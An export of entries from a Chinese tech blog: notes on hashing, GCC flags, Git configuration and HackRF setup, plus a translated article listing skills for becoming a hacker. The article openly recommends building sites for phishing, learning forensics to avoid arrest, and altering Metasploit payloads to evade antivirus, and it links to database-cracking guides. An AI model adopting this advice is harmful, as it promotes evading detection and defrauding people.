<p>常见的哈希算法有 MD5、SHA-1、SHA-256、CRC-32、CRC-64 等。</p>
<hr>
<p>注意：</p>
<ol>
<li>密码学建议，不要使用任何自己创造的私有加密算法，应该使用广泛使用的公开加密算法，这些都是已被证明安全的。</li>
<li>编码与加密主要的区别在于，所用的 Key 是否是公共所知的，或者说，编码根本就没有 Key。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>辗转相除法</title>
    <url>/2018/09/12/euclidean/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>对比几种文件共享协议</title>
    <url>/2019/04/17/file-sharing-protocol/</url>
    <content><![CDATA[<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><strong>SMB</strong>全称Server Message Block（即服务器消息块），又称Common Internet File System（即网络文件共享系统），所以也常被缩写为<strong>SMB/CIFS</strong>。</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>前端相关术语</title>
    <url>/2018/09/14/front-end-terminology/</url>
    <content><![CDATA[<h2 id="轮播图"><a href="#轮播图" class="headerlink" title="轮播图"></a>轮播图</h2><p>轮播图，在Bootstrap中又被称为Carousel，是当今网站主页非常常用的一种动态效果。</p>
<h2 id="视差滚动"><a href="#视差滚动" class="headerlink" title="视差滚动"></a>视差滚动</h2><p>视差滚动，又称Parallax Scrolling，指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。</p>
<h2 id="ToolTip"><a href="#ToolTip" class="headerlink" title="ToolTip"></a>ToolTip</h2><p>ToolTip，在Bootstrap 4 中又被称为提示冒泡。</p>
<h2 id="手风琴效果"><a href="#手风琴效果" class="headerlink" title="手风琴效果"></a>手风琴效果</h2><p>手风琴效果，又被称为Accordion。</p>
<h2 id="哈林摇"><a href="#哈林摇" class="headerlink" title="哈林摇"></a>哈林摇</h2><p>哈林摇，又称Harlem Shake。</p>
<h2 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h2><p>响应式布局，又称Responsive Layout，即一个布局可以适应多个不同终端。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC 小记</title>
    <url>/2019/04/18/gcc/</url>
    <content><![CDATA[<p>GCC 一般有两层意思，广义是指 GNU Compiler Collection（即 GNU 编译器套装），狭义是指 GNU C Compiler（即 GNU C 语言编译器），在本文中，我默认大写的 GCC 指广义，小写的 gcc 指狭义。</p>
<p>使用 gcc 编译 C 语言源代码的一般格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><p>Linux下 <code>gcc</code> 命令常用的参数及其含义如下所示：</p>
<ul>
<li><code>--help</code>：显示帮助信息</li>
<li><code>-o</code>：指定生成的文件名，若不指定，则默认生成 <code>a.out</code></li>
<li><code>-E</code>：生成 <code>.i</code> 格式的预处理文件</li>
<li><code>-S</code>：生成 <code>.s</code> 格式的汇编文件</li>
<li><code>-c</code>：生成 <code>.o</code> 格式的二进制文件</li>
<li><code>-save-temps</code>：保留所有生成的中间文件</li>
<li><code>-g</code>：生成必要的符号信息，为调试而用</li>
<li><code>-ggdb</code>：生成可特供于 gdb 使用的调试信息</li>
<li><code>-gstabs</code>：生成 stabs 格式的调试信息</li>
<li><code>-Wall</code>：显示所有常用的警告信息，即 Warning all</li>
<li><code>-m32</code>：指定生成 32 位程序</li>
<li><code>-Os</code>：为减小代码大小而进行优化，即 Optimizers small</li>
<li><code>-nostdinc</code>：不使用标准库</li>
<li><code>-fno-stack-protector</code>：不生成用于检测缓冲区溢出的代码</li>
<li><code>-I&lt;dir&gt;</code>：添加搜索头文件的路径</li>
<li><code>-fno-builtin</code>：除非用 <code>__builtin_</code> 前缀，否则不进行 <code>builtin</code> 函数的优化</li>
</ul>
<h2 id="跨平台"><a href="#跨平台" class="headerlink" title="跨平台"></a>跨平台</h2><p>为了在 Windows 中使用 GCC，诞生了 <a href="http://www.mingw.org/"><strong>MinGW</strong></a> 项目，即 Minimalist GNU for Windows（适用于 Windows 的极简 GNU），它是将 GCC 编译器和 GNU Binutils 移植到 Win32 平台下的产物，又被称为 <strong>mingw32</strong>。另有可用于产生 32 位及 64 位 Windows 可执行文件的 <a href="https://mingw-w64.org/doku.php/start"><strong>MinGW-w64</strong></a> 项目，是从原 MinGW 项目产生的分支。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Git小记</title>
    <url>/2018/08/31/git/</url>
    <content><![CDATA[<p><a href="https://git-scm.com/">Git</a>是目前<strong>最流行</strong>的<strong>分布式版本控制系统</strong>（Distributed Version Control System, <strong>DVCS</strong>），类似的工具还有<a href="https://www.mercurial-scm.org/">Mercurial</a>（由<code>hg</code>命令操作）等；在早期，人们常使用<strong>集中式版本控制系统</strong>（Centralized Version Control System，<strong>CVCS</strong>），其典型有<a href="https://www.nongnu.org/cvs/">CVS</a>、<a href="https://subversion.apache.org/">Subversion</a>（SVN）等；现在，越来越多的人开始使用更为优秀的分布式版本控制系统，所谓版本控制，即可以随时记录并切换文件的不同版本。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Git共有3个配置文件，分别是：</p>
<ul>
<li><code>/etc/gitconfig</code>文件用于配置所有用户的配置信息，使用<code>git config --system</code>命令配置</li>
<li>某个用户家目录下的<code>.gitconfig</code>文件只适用于该用户，使用<code>git config --global</code>命令配置</li>
<li>当前Git仓库的<code>.git/config</code>仅针对当前项目，直接使用<code>git config</code>命令进行配置</li>
</ul>
<p>注意：每一个级别会覆盖上一级别的配置，所以<code>.git/config</code>的配置变量会覆盖<code>/etc/gitconfig</code>中的配置变量。<br>按照个人偏好，针对新安装的Git环境，会配置如下信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置提交时使用的用户名和邮箱，必须配置</span></span><br><span class="line">git config --global user.email <span class="string">&quot;you@example.com&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;Your Name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启颜色显示</span></span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置别名</span></span><br><span class="line">git config --global alias.lg1 <span class="string">&quot;log --graph --abbrev-commit --decorate --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --all&quot;</span></span><br><span class="line">git config --global alias.lg2 <span class="string">&quot;log --graph --abbrev-commit --decorate --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n&#x27;&#x27;          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)&#x27; --all&quot;</span></span><br><span class="line">git config --global alias.lg <span class="string">&#x27;!&quot;git lg1&quot;&#x27;</span></span><br><span class="line">git config --global alias.adog <span class="string">&quot;log --all --decorate --oneline --graph&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置difftool为Meld（Windows）</span></span><br><span class="line">git config --global diff.tool meld</span><br><span class="line">git config --global difftool.meld.path <span class="string">&quot;C:\Program Files (x86)\Meld\Meld.exe&quot;</span></span><br><span class="line">git config --global difftool.prompt <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置mergetool为Meld（Windows）</span></span><br><span class="line">git config --global merge.tool meld</span><br><span class="line">git config --global mergetool.meld.path <span class="string">&quot;C:\Program Files (x86)\Meld\Meld.exe&quot;</span></span><br><span class="line">git config --global mergetool.prompt <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>另外，Git默认使用的编辑器是Vim，若要配置成自己喜欢的编辑器(如Emacs)，可使用命令：<code>git config --global core.editor emacs</code>。<br>最后，你可以使用<code>git config --list</code>来查看所有配置信息。</p>
<a id="more"></a>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>要开始对某个项目进行版本控制，需要先在其所在路径下执行<code>git init</code>进行初始化，此命令会在当前路径下创建一个<code>.git</code>的隐藏文件夹，这就是Git仓库目录。<br>Git分为3个区域，Git仓库、工作目录、暂存区域：</p>
<ul>
<li><strong>Git仓库目录</strong>（Repository）是Git用来保存项目的元数据和对象数据库的地方。这是Git中最重要的部分，从其它计算机克隆仓库时，拷贝的就是这里的数据。</li>
<li><strong>工作目录</strong>（Working directory）是对项目的某个版本独立提取出来的内容。这些从Git仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。</li>
<li><strong>暂存区域</strong>（Staging area）是一个文件，保存了下次将提交（commit）的文件列表信息，一般在Git仓库目录中。有时候也被称作“索引”，不过一般说法还是叫暂存区域。</li>
</ul>
<p>基本的Git工作流程如下：</p>
<ol>
<li>在工作目录中修改文件。</li>
<li>暂存文件，将文件的快照放入暂存区域。</li>
<li>提交更新，找到暂存区域的文件，将快照永久性存储到Git仓库目录。</li>
</ol>
<p>根据Git的三个区域，一个文件可以有如下几种状态：</p>
<ul>
<li><strong>未跟踪状态</strong>（untracked）：指新创建且还没有添加到暂存区域的文件</li>
<li><strong>已暂存状态</strong>（staged）：指已经添加到暂存区域的文件</li>
<li><strong>已提交状态</strong>（committed）：指已经从暂存区提交到Git仓库的文件</li>
<li><strong>已修改状态</strong>（modified）：指作了修改但还没有放到暂存区域的文件</li>
</ul>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>每一次提交都是文件的一个版本，可以将这一系列提交看作一条<strong>链表</strong>，链表的头指针（<strong>HEAD</strong>）始终指向最新的提交，即最新的版本。要检出到某一版本，本质上是将HEAD指针指向某一提交。链表中的节点（即提交）都有唯一的父节点和唯一的子节点，Git中<strong>分支</strong>（branch）的本质就是将链表变为<strong>树</strong>。当使用<code>git init</code>初始化Git仓库时，会默认创建<code>master</code>分支，这种一个分支等价于一条链表。<br>使用<code>git branch</code>可列出所有分支，使用<code>git branch dev</code>即可在当前提交点创建新分支<code>dev</code>，接着使用<code>git checkout dev</code>即可切换到<code>dev</code>分支，或者直接使用<code>git checkout -b dev</code>即可一步创建并切换到<code>dev</code>新分支。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul>
<li><code>git version</code>：查看Git版本信息</li>
<li><code>git add test1.txt</code>：将需要被追踪的文件（test1.txt）添加到暂存区域</li>
<li><code>git reset test2.txt</code>：将误被追踪的文件（test2.txt）移除出暂存区域，文件仍会存在于工作目录</li>
<li><code>git commit -m &#39;first commit&#39;</code>：将暂存区域的内容提交到本地仓库，参数<code>-m</code>指定提交时的附带信息，若不带参数<code>-m</code>执行此命令则会自动打开默认的Vim编辑器并要求输入附带信息</li>
<li><code>git push</code>：将本地仓库推送到远程仓库</li>
<li><code>git clone</code>：将远程仓库克隆到本地</li>
<li><code>git pull</code>：将远程仓库的更新拉取到本地仓库</li>
<li><code>git status</code>：查看Git仓库状态</li>
<li><code>git log</code>：查看commit记录，参数<code>--graph</code>可以图形化显示，参数<code>--oneline</code>可以一行显示。</li>
<li><code>git diff</code>：对比工作目录和暂存区域中文件之间的不同</li>
<li><code>git diff --staged</code>：对比暂存区域和Git仓库中最新commit文件之间的不同</li>
<li><code>git diff &lt;first-commit-id&gt; &lt;second-commit-id&gt;</code>：对比Git仓库中两个commit之间的不同，参数为两个commit ID，为方便可以取ID的前7个字符</li>
<li><code>git checkout &lt;commit-id&gt;</code>：切换到某个具体的commit，要切换回最新的commit可使用<code>git checkout master</code></li>
</ul>
<h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p><strong>直接记录快照，而非差异比较</strong>：Git与其他版本控制系统的主要区别在于对待数据的方法，其他的VCS主要记录不同版本之间的差异，而Git则相当于直接记录不同版本的快照。<br><strong>近乎所有操作都是本地执行</strong>：在Git中的绝大多数操作都只需要访问本地文件和资源，一般不需要来自网络上其它计算机的信息。<br><strong>Git保证完整性</strong>：Git中所有数据在存储前都计算校验和(SHA-1)，然后以校验和来引用。这意味着不可能在Git不知情时更改任何文件内容或目录内容。若你在传送过程中丢失信息或损坏文件，Git就能发现。<br><strong>Git一般只添加数据</strong>：你执行的Git操作，几乎只往Git数据库中增加数据。很难让Git执行任何不可逆操作，或者让它以任何方式清除数据。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p>应明确一点，Git是由Linux创始人Linus Torvalds开发的分布式版本控制系统，而GitHub是使用Git实现的代码托管网站，两者并非一类。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>在命令行中直接输入<code>git</code>，可查看相关命令，要具体查看某个命令的帮助信息，可输入<code>git help &lt;command&gt;</code>，如<code>git help diff</code>，要了解更多关于Git的内容，可以参考<a href="https://git-scm.com/book/zh/v2">《Pro Git》</a>一书。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用GitBook编写电子书籍</title>
    <url>/2018/12/16/gitbook/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>成为黑客高手的必备技能</title>
    <url>/2019/02/25/hacker-essential-skills/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/essential-skills-becoming-master-hacker-0154509/">https://null-byte.wonderhowto.com/how-to/essential-skills-becoming-master-hacker-0154509/</a> ，正文如下：</p>
<p>我的许多有抱负的黑客写信给我，都问同样的问题。“我需要什么技能才能成为一个好的黑客？”</p>
<p>由于黑客是最熟练的信息技术学科之一，因此需要广泛的 IT 技术和技术知识。要真正成为一名优秀的黑客，必须掌握许多技能。如果你没有我在此列出的所有技能，请不要气馁，可以将此列表作为你在不久的将来学习和掌握所需内容的起点。</p>
<a id="more"></a>
<p><img src="https://img.wonderhowto.com/img/original/78/70/63533756748235/0/635337567482357870.jpg" alt="image"><br>这是我进入这个精英 IT 行业的万神殿所需技能的概述列表。我将这些技能分为三类，以帮助你从一个级别转到另一个级别，更容易掌握基本技能、中级技能和无形技能，并提供了指向 Null Byte 相关文章的链接，供你了解。</p>
<h2 id="基本技能"><a href="#基本技能" class="headerlink" title="基本技能"></a>基本技能</h2><p>这些是每个黑客在尝试破解之前应该知道的基础知识。一旦掌握了本节中的所有内容，就可以进入中间层。</p>
<h3 id="基本的计算机技能"><a href="#基本的计算机技能" class="headerlink" title="基本的计算机技能"></a>基本的计算机技能</h3><p>不用说，要成为一名黑客，你需要一些基本的计算机技能。这些技能超出了创建 Word 文档或浏览 Internet 的能力。你需要能够在 Windows 中使用命令行，编辑注册表以及设置网络参数。</p>
<p>许多这些基本技能可以在像 A+ 这样的基础计算机技能课程中获得。</p>
<h3 id="网络技能"><a href="#网络技能" class="headerlink" title="网络技能"></a>网络技能</h3><p>你需要了解网络的基础知识，例如以下内容。</p>
<ul>
<li>DHCP</li>
<li>NAT</li>
<li>子网划分</li>
<li>IPv4</li>
<li>IPv6</li>
<li>公有和私有 IP</li>
<li>DNS</li>
<li>路由器和交换机</li>
<li>VLANs</li>
<li>OSI 模型</li>
<li>MAC 寻址</li>
<li>ARP</li>
</ul>
<p>由于我们经常利用这些技术，你越了解它们的工作方式，你就会越成功。请注意，我没有编写下面的两个指南，但它们非常有用，并涵盖了上面提到的一些网络基础知识。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hacker-fundamentals-tale-two-standards-0133727/">黑客基础：两个标准的故事</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hacker-fundamentals-everymans-guide-network-packets-are-routed-across-web-0134491/">一般人的网络数据包路由指南</a></li>
</ul>
<h3 id="Linux-技能"><a href="#Linux-技能" class="headerlink" title="Linux 技能"></a>Linux 技能</h3><p>发展 Linux 技能对于成为黑客是非常关键的。我们用作黑客的几乎所有工具都是为 Linux 开发的，Linux 为我们提供了使用 Windows 时没有的功能。</p>
<p>如果你需要提高你的 Linux 技能，或者你刚开始使用 Linux，请查看下面我的 Linux 初学者系列。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/linux-basics/">针对有抱负的黑客的 Linux 基础知识</a></li>
</ul>
<h3 id="Wireshark-或-Tcpdump"><a href="#Wireshark-或-Tcpdump" class="headerlink" title="Wireshark 或 Tcpdump"></a>Wireshark 或 Tcpdump</h3><p>Wireshark 是使用最广泛的嗅探器/协议分析器，而 tcpdump 是命令行嗅探器/协议分析器。两者在分析 TCP/IP 流量和攻击方面都非常有用。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/spy-your-buddys-network-traffic-intro-wireshark-and-osi-model-0133807/">Wireshark 和 OSI 模型介绍</a></li>
<li><a href="https://null-byte.wonderhowto.com/news/8-wireshark-filters-every-wiretapper-uses-spy-web-conversations-and-surfing-habits-0134508/">Wireshark 过滤器</a></li>
</ul>
<h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><p>你需要熟练使用其中一个虚拟化软件包，如 <a href="https://www.virtualbox.org/">VirtualBox</a> 或 <a href="https://www.vmware.com/products/workstation-pro.html">VMWare Workstation</a>。理想情况下，你需要一个安全的环境来练习你的黑客攻击行为，之后才能将它们带出现实世界。虚拟环境为你提供了一个安全的环境，可以在使用它们之前测试和优化你的黑客攻击。</p>
<h3 id="安全概念与技术"><a href="#安全概念与技术" class="headerlink" title="安全概念与技术"></a>安全概念与技术</h3><p>优秀的黑客了解安全概念和技术。克服安全管理员建立的障碍的唯一方法是熟悉它们。黑客必须了解诸如PKI（公钥基础架构），SSL（安全套接层），IDS（入侵检测系统），防火墙等等。</p>
<p>黑客初学者可以在 Security+ 等基本安全课程中获得许多这些技能。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/snort/">如何读写 Snort 规则来躲避 IDS</a></li>
</ul>
<h3 id="无线技术"><a href="#无线技术" class="headerlink" title="无线技术"></a>无线技术</h3><p>为了能够破解无线，你必须首先了解它的工作原理。诸如加密算法（WEP，WPA，WPA2），四次握手和 WPS 之类的东西。此外，理解诸如连接和认证协议以及无线技术的法律约束等。</p>
<p>要开始学习，请查看以下有关无线术语和技术入门的指南，然后阅读我们的 Wi-Fi 黑客指南集，了解有关各种加密算法的详细信息以及每种黑客如何工作的示例。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-terms-technologies-0147659/">Wi-Fi 术语和技术入门</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/">有抱负的黑客入侵 Wi-Fi 指南</a></li>
</ul>
<h2 id="中级技能"><a href="#中级技能" class="headerlink" title="中级技能"></a>中级技能</h2><p>这是事情变得有趣的地方，你真正开始感受到你作为黑客的能力。知道所有这些将允许你进入更直观的黑客攻击所有镜头 —— 而不是其他一些黑客。</p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>如果没有<a href="https://null-byte.wonderhowto.com/how-to/scripting/">编写脚本的技能</a>，黑客将被降级为使用其他黑客工具。这限制了你的效率。每天都会有一个新工具失效，因为安全管理员提出了防御措施。</p>
<p>要开发自己独特的工具，你需要至少熟练掌握一种脚本语言，包括 BASH shell。这些应该包括 Perl，Python 或 Ruby 之一。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-perl-scripting-for-aspiring-hacker-part-1-0151750/">针对有抱负的黑客的 Perl 脚本</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-1-bash-basics-0149422/">为有抱负的黑客编写脚本，第 1 部分：BASH 基础知识</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-2-conditional-statements-0149695/">为有抱负的黑客编写脚本，第 2 部分：条件语句</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-scripting-for-aspiring-hacker-part-3-windows-powershell-0151075/">为有抱负的黑客编写脚本，第 3 部分：Windows PowerShell</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/">Metasploit 中 Meterpreter 的黑客脚本终极列表</a></li>
</ul>
<h3 id="数据库技能"><a href="#数据库技能" class="headerlink" title="数据库技能"></a>数据库技能</h3><p>如果你希望能够熟练地<a href="https://null-byte.wonderhowto.com/how-to/db-hacking/">破解数据库</a>，则需要了解数据库及其工作原理。这包括 SQL 语言。我还建议掌握一个主要的 DBMS，如 SQL Server，Oracle 或 MySQL。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-terms-technologies-you-need-know-before-getting-started-0148773/">入门前需要了解的术语和技术</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-hunting-for-microsofts-sql-server-0148993/">寻找微软的 SQL Server</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-cracking-sql-server-passwords-owning-server-0149636/">破解 SQL Server 密码并拥有服务器</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-hacking-mysql-online-databases-with-sqlmap-0150368/">使用 Sqlmap 攻击 MySQL 在线数据库</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-databases-extracting-data-from-online-databases-using-sqlmap-0150688/">使用 Sqlmap 从在线数据库中提取数据</a></li>
</ul>
<h3 id="Web-应用程序"><a href="#Web-应用程序" class="headerlink" title="Web 应用程序"></a>Web 应用程序</h3><p>Web 应用程序可能是近年来黑客最肥沃的土壤。你对Web应用程序如何工作以及它们背后的数据库了解得越多，你就会越成功。此外，你可能需要建立自己的网站以进行网络钓鱼和其他恶意目的。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-clone-any-website-using-httrack-0152420/">如何使用 HTTrack 克隆任何网站</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-spoof-dns-lan-redirect-traffic-your-fake-website-0151620/">如何将流量重定向到假网站</a></li>
</ul>
<h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><p>要成为好黑客，一定不要被抓住！你不能成为一名坐在牢房里 5 年的职业黑客。你对数字取证的了解越多，就越能避免和规避检测。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-1-tools-techniques-0149732/">数字取证，第 1 部分：工具和技术</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-2-network-forensics-0149958/">数字取证，第 2 部分：网络取证</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-3-recovering-deleted-files-0149868/">数字取证，第 3 部分：恢复已删除的文件</a></li>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-digital-forensics-for-aspiring-hacker-part-4-evading-detection-while-dosing-0150445/">数字取证，第 4 部分：DoSing 时的逃避检测</a></li>
</ul>
<h3 id="高级-TCP-IP"><a href="#高级-TCP-IP" class="headerlink" title="高级 TCP/IP"></a>高级 TCP/IP</h3><p>黑客初学者必须了解 TCP/IP 基础知识，但要升级到中级，你必须了解 TCP/IP 协议栈和字段的详细信息。这些包括 TCP 和 IP 数据包中的每个字段（flags，window，df，tos，seq，ack 等）如何被操纵并用于对抗受害者系统以启用中间人攻击等。</p>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>虽然要成为一个好的黑客不需要成为一个密码学家，但是你越了解每种密码算法的优缺点，就越有可能打败它。此外，黑客还可以利用密码学来隐藏他们的活动并逃避检测。</p>
<h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>通过逆向工程，你可以打开一个恶意软件并使用其他功能重新构建它。就像在软件工程中一样，没有人从头开始构建新的应用程序。几乎每个新漏洞或恶意软件都使用其他现有恶意软件中的组件。</p>
<p>此外，逆向工程使黑客能够利用现有漏洞并更改其签名，以便它可以绕过 IDS 和<a href="https://null-byte.wonderhowto.com/how-to/evading-av-software/">防病毒检测</a>。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-change-signature-metasploit-payloads-evade-antivirus-detection-0149867/">如何更改 Metasploit 有效载荷签名以避免防病毒检测</a></li>
</ul>
<h2 id="无形技能"><a href="#无形技能" class="headerlink" title="无形技能"></a>无形技能</h2><p>除了所有这些计算机技能外，成功的黑客还必须具备一些无形技能。这些包括以下内容。</p>
<h3 id="创造性地思考"><a href="#创造性地思考" class="headerlink" title="创造性地思考"></a>创造性地思考</h3><p>黑客攻击系统总是有办法的，而且有很多方法可以实现。一个好的黑客可以创造性地思考同一个黑客的多种方法。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/social-engineering/">Null Byte 的社会工程学指南</a></li>
<li><a href="https://null-byte.wonderhowto.com/forum/cryptolocker-innovative-creative-hack-0151753/">CryptoLocker：一个创新和创造性的黑客</a></li>
</ul>
<h3 id="解决问题的能力"><a href="#解决问题的能力" class="headerlink" title="解决问题的能力"></a>解决问题的能力</h3><p>黑客总是遇到看似无法解决的问题。这就要求黑客习惯于分析性思维和解决问题。这通常要求黑客准确地诊断出问题所在，然后将问题分解为不同的组件。这是伴随着许多小时的练习而来的能力之一。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/forum/problem-solving-is-essential-hacker-skill-0150882/">解决问题是一项必不可少的黑客技能</a></li>
</ul>
<h3 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h3><p>黑客必须坚持不懈。如果你一开始失败了，请再试一次。如果再失败，请提出一种新的方法并重试。只有坚持不懈，你才能破解最安全的系统。</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/forum/so-you-want-be-hacker-0148983/">那么......你想成为黑客吗？</a></li>
</ul>
<p>我希望这能给你一些指导，让你了解你需要学习和掌握什么，才能提升到黑客的中级水平。在未来的一篇文章中，我将讨论你需要掌握什么才能提升到高级或大师级的黑客，所以请记着回来，我的新手黑客们！</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>HackRF 初体验</title>
    <url>/2020/01/22/hackrf/</url>
    <content><![CDATA[<p><a href="https://greatscottgadgets.com/hackrf/">HackRF</a> 是由 Great Scott Gadgets 设计和制造的开源 SDR 硬件，其可以发送或接收 1 MHz 到 6 GHz 的无线电信号。目前 HackRF 的具体版本为 HackRF One。你可以通过其<a href="https://greatscottgadgets.com/wheretobuy/">官网上列出的购买网址</a>购买它，也可以在万能的淘宝上购买。<img src="https://greatscottgadgets.com/images/h1-preliminary1-445.jpeg" alt="HackRF One"></p>
<a id="more"></a>

<h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>你需要安装如下软件以使用 HackRF One：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:bladerf/bladerf</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/gnuradio</span><br><span class="line">sudo add-apt-repository -y ppa:gqrx/gqrx-sdr</span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install gqrx-sdr hackrf</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hackrf_info    # 查看 Hack RF 连接信息</span><br><span class="line"></span><br><span class="line">hackrf_transfer    # 基于文件进行发送和接收 SDR</span><br><span class="line">hackrf_transfer -h    # 查看 hackrf_transfer 帮助信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 录制信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -r：将数据存储到文件中</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -f：中心频率，单位 Hz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -s：采样率，单位 Hz（4/8/10/12.5/16/20 MHz，默认 10 MHz）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -n：采样数量（默认值是无限的）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -a：设置功放（1 表示开启，0 表示关闭）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -g：设置 Rx VGA 增益（0 到 62 dB 之间，每次增加 2 dB）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -l：设置 Rx LNA 增益（0 到 40 dB 之间，每次增加 8 dB）</span></span><br><span class="line">hackrf_transfer -r capture.raw -f 315000000 -l 8/16/24 -g 20/40 [-s 2000000 -n 10000000 -a 1]</span><br><span class="line"></span><br><span class="line"><span 